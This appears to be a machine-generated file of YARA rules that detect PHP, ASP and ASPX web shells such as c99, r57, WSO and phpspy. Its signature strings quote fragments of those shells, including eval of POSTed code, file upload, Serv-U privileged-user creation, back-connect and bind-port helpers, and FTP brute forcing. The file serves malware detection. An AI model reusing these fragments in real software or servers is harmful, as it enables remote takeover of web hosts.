      $s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", True" fullword ascii
      $s2 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", True" fullword ascii
      $s3 = "leaves = leaves & \"-SETUSERSETUP\" & vbcrlf & \"-IP=0.0.0.0\" & vbcrlf & \"-PortNo=\" & tport & vbcrlf & \"-User=\" & tuser & v" ascii
      $s4 = "leaves = leaves & \"-SETUSERSETUP\" & vbcrlf & \"-IP=0.0.0.0\" & vbcrlf & \"-PortNo=\" & tport & vbcrlf & \"-User=\" & tuser & v" ascii
      $s5 = "Set xPost3 = CreateObject(\"MSXML2.XMLHTTP\")" fullword ascii
      $s6 = "Set xPost = CreateObject(\"MSXML2.XMLHTTP\")" fullword ascii
      $s7 = "'Command = request.Form(\"dcmd\")" fullword ascii
      $s8 = "xPost3.Send(leaves)" fullword ascii
      $s9 = "xPost.Send(leaves)" fullword ascii
      $s10 = "\"-Maintenance=System\" & vbcrlf & \"-PasswordType=Regular\" & vbcrlf & \"-Ratios=None\" & vbcrlf & \" Access=\" & tpath & \"\\|" ascii
      $s11 = "leaves = leaves & \"-DELETEUSER\" & vbcrlf & \"-IP=0.0.0.0\" & vbcrlf & \"-PortNo=\" & tport & vbcrlf & \" User=\" & tuser & vbc" ascii
      $s12 = "\"-HomeDir=\" & tpath & \"\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vbcrlf & \"-RelPaths=1\" & vbcrlf & _" fullword ascii
      $s13 = "\"-Maintenance=System\" & vbcrlf & \"-PasswordType=Regular\" & vbcrlf & \"-Ratios=None\" & vbcrlf & \" Access=\" & tpath & \"\\|" ascii
      $s14 = "\"-NeedSecure=0\" & vbcrlf & \"-HideHidden=0\" & vbcrlf & \"-AlwaysAllowLogin=0\" & vbcrlf & \"-ChangePassword=0\" & vbcrlf & _" fullword ascii
      $s15 = "\"-QuotaEnable=0\" & vbcrlf & \"-MaxUsersLoginPerIP=-1\" & vbcrlf & \"-SpeedLimitUp=0\" & vbcrlf & \"-SpeedLimitDown=0\" & vbcrl" ascii
      $s16 = "Set xPOST3=nothing" fullword ascii
      $s17 = "Set xPOST=nothing" fullword ascii
      $s18 = "\"-MaxNrUsers=-1\" & vbcrlf & \"-IdleTimeOut=600\" & vbcrlf & \"-SessionTimeOut=-1\" & vbcrlf & \"-Expire=0\" & vbcrlf & \"-Rati" ascii
      $s19 = "\"-MaxNrUsers=-1\" & vbcrlf & \"-IdleTimeOut=600\" & vbcrlf & \"-SessionTimeOut=-1\" & vbcrlf & \"-Expire=0\" & vbcrlf & \"-Rati" ascii
      $s20 = "\"-Password=\" & tpass & vbcrlf & _" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99shell_c99_197 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "//DON'T FORGOT ABOUT PASSWORD!!!" fullword ascii
      $s2 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $s3 = "  \"c99sh_datapipe.pl\" => \"c99sh_datapipe_pl.txt\"," fullword ascii
      $s4 = "  \"c99sh_bindport.pl\" => \"c99sh_bindport_pl.txt\"," fullword ascii
      $s5 = "  \"c99sh_bindport.c\" => \"c99sh_bindport_c.txt\"," fullword ascii
      $s6 = "  \"c99sh_datapipe.c\" => \"c99sh_datapipe_c.txt\"," fullword ascii
      $s7 = "$login = \"\"; //login" fullword ascii
      $s8 = " if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}" fullword ascii
      $s9 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
      $s10 = "  \"c99sh_bindport.c\"=>array(\"Using C\",\"%path %port %pass\")" fullword ascii
      $s11 = "   elseif (!$data = c99getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s12 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword ascii
      $s13 = "  \"c99sh_backconn.c\"=>array(\"Using C\",\"%path %host %port\")" fullword ascii
      $s14 = "$pass = \"\"; //password" fullword ascii
      $s15 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehost %remoteport\")," fullword ascii
      $s16 = "  \"c99sh_backconn.pl\" => \"c99sh_backconn_pl.txt\"," fullword ascii
      $s17 = "  \"c99sh_backconn.c\" => \"c99sh_backconn_c.txt\"," fullword ascii
      $s18 = "  \"c99sh_datapipe.c\"=>array(\"Using C\",\"%path %localport %remoteport %remotehost\")" fullword ascii
      $s19 = "  \"c99sh_bindport.pl\"=>array(\"Using PERL\",\"perl %path %port\")," fullword ascii
      $s20 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _KAdot_Universal_Shell_v0_1_6_NIX_REMOTE_WEB_SHELL_198 {
   meta:
      description = "webshell - from files KAdot Universal Shell v0.1.6.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "06d8c97448db0b9c7790e0d94fcb8db79162ea23ac65f1f74e687f3186017f73"
      hash2 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "//PHP Eval Code execution" fullword ascii
      $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword ascii
      $s3 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword ascii
      $s4 = "if (isset($_POST['ephp'])){" fullword ascii
      $s5 = "if (copy($_FILES['file']['tmp_name'], $uploadfile)) {" fullword ascii
      $s6 = "<form enctype=\"multipart/form-data\" action=\"$self\" method=\"POST\">" fullword ascii
      $s7 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword ascii
      $s8 = "<form method=\"POST\" action=\"$self\">" fullword ascii
      $s9 = "if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}" fullword ascii
      $s10 = "eval($_POST['ephp']);" fullword ascii
      $s11 = "if (isset($_POST['path'])){" fullword ascii
      $s12 = "$docr = $_SERVER['DOCUMENT_ROOT'];" fullword ascii
      $s13 = "// Uploading" fullword ascii
      $s14 = "<input type=\"hidden\" name=\"ac\" value=\"upload\">" fullword ascii
      $s15 = "case \"shell\":" fullword ascii
      $s16 = "<td><textarea name=\"ephp\" rows=\"10\" cols=\"60\"></textarea></td>" fullword ascii
      $s17 = "<input type=\"hidden\" name=\"ac\" value=\"eval\">" fullword ascii
      $s18 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type=\"submit\" value=\"" fullword ascii
      $s19 = "<td><input size=\"48\" name=\"file\" type=\"file\"></td>" fullword ascii
      $s20 = "$sern = $_SERVER['SERVER_NAME'];" fullword ascii
   condition:
      ( ( uint16(0) == 0x213c or uint16(0) == 0x3f3c ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_2008_phpspy_2006_lnc_2009mssql_199 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, 2008.php, phpspy_2006.php, lnc.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash4 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash5 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$this -> addFile($content, $filename);" fullword ascii
      $s2 = "if(is_dir($f)) $this->GetFileList($f);" fullword ascii
      $s3 = "function GetFileList($dir){" fullword ascii
      $s4 = "$this->out = $this -> file();" fullword ascii
      $s5 = "if (@function_exists('gzcompress'))" fullword ascii
      $s6 = "$timearray['hours']   = 0;" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "var $datasec      = array();" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "$timearray['mday']    = 1;" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "$zip=new PHPZip($dl);" fullword ascii
      $s10 = "$timearray['year']    = 1980;" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "if (count($filelist)>0){" fullword ascii
      $s12 = "function file() {" fullword ascii
      $s13 = "function addFile($data, $name, $time = 0) {" fullword ascii
      $s14 = "foreach($filelist as $filename){" fullword ascii
      $s15 = "static $a;" fullword ascii
      $s16 = "else chdir($curdir);" fullword ascii
      $s17 = "$timearray['mon']     = 1;" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "$dfiles=substr($dfiles,0,strlen($dfiles)-1);" fullword ascii
      $s19 = "if (is_array($dir)) $filelist = $dir;" fullword ascii
      $s20 = "$code=$zip->out;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_WSO_4_0_5_wso_200 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php, WSO_4_0_5.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash4 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash5 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['name']).'\\', \\'rename\\')\">R</a> <a href=\"#\" " ascii
      $s2 = ", \\'download\\')\">D</a>':'').'</td></tr>';" fullword ascii
      $s3 = "$_POST['a'] = $default_action;" fullword ascii
      $s4 = "if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))" fullword ascii
      $s5 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';" fullword ascii
      $s6 = "<td><form method='post' ENCTYPE='multipart/form-data'>" fullword ascii
      $s7 = "if(isset($default_action) && function_exists('action' . $default_action))" fullword ascii
      $s8 = "foreach($item as $key => $value)" fullword ascii
      $s9 = "if(!empty($GLOBALS['auth_pass']))" fullword ascii
      $s10 = "foreach($item as $key => $value) {" fullword ascii
      $s11 = "while ( ($item = readdir($dh) ) !== false) {" fullword ascii
      $s12 = "\\',null,\\''.urlencode($f['name']).'\\', \\'edit\\')\">E</a> <a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f[" ascii
      $s13 = "echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style=\"font-weight: normal;\"><pre>'.$h[" ascii
      $s14 = "<input type=hidden name=a value='FilesMAn'>" fullword ascii
      $s15 = "$item[$k] = \"'\".addslashes($v).\"'\";" fullword ascii
      $s16 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['name']).'\\', \\'rename\\')\">R</a> <a href=\"#\" " ascii
      $s17 = "$item = $path.$item;" fullword ascii
      $s18 = "while($item = $db->fetch())" fullword ascii
      $s19 = "deleteDir($item);" fullword ascii
      $s20 = "while($item = $db->fetch()) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_c99_w4cking_c99_201 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, c99_w4cking.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s2 = "if ($surl_autofill_include and !$_REQUEST[\"c99sh_surl\"]) {$include = \"&\"; foreach (explode(\"&\",getenv(\"QUERY_STRING\")) a" ascii
      $s3 = "     $fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s4 = "    if ($fqb_logemail) {@mail($fqb_logemail,\"c99shell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s5 = " if ($actemptybuff) {$sess_data[\"copy\"] = $sess_data[\"cut\"] = array(); c99_sess_put($sess_data);}" fullword ascii
      $s6 = "$sess_cookie = \"c99shvars\"; // Cookie-variable name" fullword ascii
      $s7 = "     if (c99ftpbrutecheck(\"localhost\",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))" fullword ascii
      $s8 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
      $s9 = "e, report us for fix.\";}" fullword ascii
      $s10 = "elseif (!empty($set_surl)) {$surl = $set_surl; setcookie(\"c99sh_surl\",$surl);}" fullword ascii
      $s11 = "  c99_sess_put($sess_data);" fullword ascii
      $s12 = " c99_buff_prepare();" fullword ascii
      $s13 = " elseif ($act == \"unselect\") {foreach ($sess_data[\"copy\"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data[\"copy\"][" ascii
      $s14 = "if (!function_exists(\"c99fsearch\"))" fullword ascii
      $s15 = "if (!function_exists(\"c99_sess_put\"))" fullword ascii
      $s16 = "function c99fsearch($d)" fullword ascii
      $s17 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
      $s18 = "  foreach($in as $v) {c99fsearch($v);}" fullword ascii
      $s19 = "function c99_sess_put($data)" fullword ascii
      $s20 = " if ($act == \"copy\") {$err = \"\"; $sess_data[\"copy\"] = array_merge($sess_data[\"copy\"],$actbox); c99_sess_put($sess_data);" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_2014_D_____ASP__wt_asp__1____202 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, 2014.asp, D -  [ASP].asp, wt.asp, asp (1).asp, .asp, 2013.asp, .asp, vps.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
      hash5 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash8 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash9 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash10 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash11 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "CONST_FSO=\"Script\"&\"ing.Fil\"&\"eSyst\"&\"emObject\"" fullword ascii
      $s2 = "getAtt.Attributes = getAtt.Attributes" fullword ascii
      $s3 = "if (CheckFile=True) and (IS_TEMP_DIR=false) then" fullword ascii
      $s4 = "</font>]\"&Path&\" [<font color=red>\"&Err.Description&\"</font>]<br>\"" fullword ascii
      $s5 = "</font>]\"&Path&file.name&\" [<font color=red>\"&Err.Description&\"</font>]<br>\"" fullword ascii
      $s6 = "set f = fso.getfolder(Path)" fullword ascii
      $s7 = "set getAtt=FSO.GetFile(filepath)" fullword ascii
      $s8 = "function GetFullPath(path)" fullword ascii
      $s9 = "set getAtt = Nothing  " fullword ascii
      $s10 = "GetFullPath = path" fullword ascii
      $s11 = "  CheckFileWrite = Err.Number " fullword ascii
      $s12 = "set FSO = Nothing" fullword ascii
      $s13 = "function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)" fullword ascii
      $s14 = "for each file in f.SubFolders" fullword ascii
      $s15 = "]<font color=red>\"&Path&\"</font><br>\"" fullword ascii
      $s16 = "function CheckFileWrite(filepath)" fullword ascii
      $s17 = "Set FSO = Server.CreateObject(CONST_FSO)" fullword ascii
      $s18 = "re = CheckDirIsOKWrite(Path&file.name)" fullword ascii
      $s19 = "]<font color=#0066FF>\"& Path&file.name&\"</font><br>\"" fullword ascii
      $s20 = "for each file in f.Files" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c or uint16(0) == 0x483c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99shell_c99_203 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99shell.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "gn=\"left\"><b><?php if (!$win) {echo wordwrap(myshellexec(\"id\"),90,\"<br>\",1);} else {echo get_current_user();} ?></b>&nbsp;" ascii
      $s2 = "lor: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#00000" ascii
      $s3 = ">!</b></font><a href=\"<?php echo $surl; ?>\"><font face=\"Verdana\" size=\"5\"><b>C99Shell v. <?php echo $shver; ?></b></font><" ascii
      $s4 = "dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font" ascii
      $s5 = "cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor" ascii
      $s6 = "-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A {" ascii
      $s7 = "SOFTWARE; ?></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,\"<br>\",1); ?></b>&nbsp;</p><p" ascii
      $s8 = "ace;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.men" ascii
      $s9 = "nd-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #8000" ascii
      $s10 = "EIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top" ascii
      $s11 = "oma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1" ascii
      $s12 = "ff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT:" ascii
      $s13 = " normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; " ascii
      $s14 = "uitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tah" ascii
      $s15 = " solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}" ascii
      $s16 = "00; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-H" ascii
      $s17 = "#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webding" ascii
      $s18 = "nt face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;<?php echo $DISP_SERVE" ascii
      $s19 = "</body></html><?php chdir($lastdir); c99shexit(); ?>" fullword ascii
      $s20 = " verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_SnIpEr_SA_Shell_r57_204 {
   meta:
      description = "webshell - from files r57shell.php, SnIpEr_SA Shell.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s2 = "// $language='eng' - english (??????????)" fullword ascii
      $s3 = "// $language='ru' - ??????? (russian)" fullword ascii
      $s4 = "'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????'," fullword ascii
      $s5 = "'ru_text94'=>'FTP-????????'," fullword ascii
      $s6 = "'ru_text88'=>'FTP-??????:????'," fullword ascii
      $s7 = "'ru_text89'=>'???? ?? ftp ???????'," fullword ascii
      $s8 = "'ru_text102'=>'?????'," fullword ascii
      $s9 = "'ru_text105'=>'????'," fullword ascii
      $s10 = "'ru_text91'=>'???????????? ?'," fullword ascii
      $s11 = "'ru_text98'=>'??????? ???????????: '," fullword ascii
      $s12 = "'ru_text90'=>'????? ????????'," fullword ascii
      $s13 = "'ru_text109'=>'????????'," fullword ascii
      $s14 = "'ru_text103'=>'???????? ??????'," fullword ascii
      $s15 = "'ru_text110'=>'??????????'," fullword ascii
      $s16 = "'ru_text86'=>'?????????? ????? ? ???????'," fullword ascii
      $s17 = "'ru_text104'=>'???????? ????? ?? ???????? ????'," fullword ascii
      $s18 = "'ru_butt15'=>'?????????'," fullword ascii
      $s19 = "'ru_butt14'=>'???????'," fullword ascii
      $s20 = "'ru_text108'=>'????? ??????'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule __wt_205 {
   meta:
      description = "webshell - from files .aspx, wt.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "331d081d6fa2241b5b695dffcdf830d9bcd52d97a472057168a4a487215f805b"
      hash2 = "350062ce5c25e1ba1c5fbed77081ed88789bf79bbdab2301092a591eddaa665a"
   strings:
      $s1 = "                                            if (list.IndexOf(temp + \"\\\\\") == -1)" fullword ascii
      $s2 = "<%@ import Namespace=\"System.Collections.Generic\"%>" fullword ascii
      $s3 = "                                        while (temp.IndexOf(\"\\\\\") != -1)" fullword ascii
      $s4 = "                                            if (list.IndexOf(temp) == -1)" fullword ascii
      $s5 = "                    string[] keys = Hklm.GetSubKeyNames();" fullword ascii
      $s6 = "                                        if (!temp.EndsWith(\"\\\\\"))" fullword ascii
      $s7 = "                                        temp = match.Value;" fullword ascii
      $s8 = "                                    string temp = \"\";" fullword ascii
      $s9 = "                                            temp = temp.Substring(0, temp.LastIndexOf(\"\\\\\"));" fullword ascii
      $s10 = "                            string str = Hklm.GetValue(name).ToString().ToLower();" fullword ascii
      $s11 = "                    string[] names = Hklm.GetValueNames();" fullword ascii
      $s12 = "                    foreach (string key in keys)" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897_2014_4_0__1__2013____1__206 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, 2014.asp, 4.0 (1).asp, 2013.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s2 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='?Action=upload' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s4 = "j cdx&\"<a href='?Action=goback' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s5 = "j cdx&\"<a href='?Action=UpFile' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s6 = "j cdx&\"<a href='?Action=getTerminalInfo' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s7 = "j cdx&\"<a href='?Action=TSearch' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s8 = "j cdx&\"<a href='?Action=EditFile' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s9 = "j cdx&\"<a href='?Action=PageAddToMdb' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s10 = "j\"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==\"\"\"\"){document.getElementBy" ascii
      $s11 = "j\"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==\"\"\"\"){document.getElementBy" ascii
      $s12 = "j cdx&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\Newfile\")&\"\"\",\"\"NewFolder\"\")'>\"&cxd&\" " fullword ascii
      $s13 = "j\"</table></td></tr><tr><td valign=\"\"top\"\" align=center><table border=0><tr><td id=d width=95 onMouseOver=\"\"this.style.ba" ascii
      $s14 = "dColor='#696969'\"\" onMouseOut=\"\"this.style.backgroundColor='#121212'\"\"><a href='javascript:ShowFolder(\"\"\"&RePath(WWWRoo" ascii
      $s15 = "j cdx&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\vti_cnf..\\\\\")&\"\"\",\"\"NewFolder\"\")'>\"&cx" ascii
      $s16 = "j cdx&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\vti_cnf..\\\\\")&\"\"\",\"\"NewFolder\"\")'>\"&cx" ascii
      $s17 = "Set ABC=New LBF:j ABC.ShowDriver():Set ABC=Nothing" fullword ascii
      $s18 = "---CMD\"&ef" fullword ascii
      $s19 = "adding='0'><tr><td height='5'></td></tr><tr><td><center><font color=pink><font size=1.0>\"&mName&\"</font></font></center><hr co" ascii
      $s20 = "--CMD2\"&ef" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

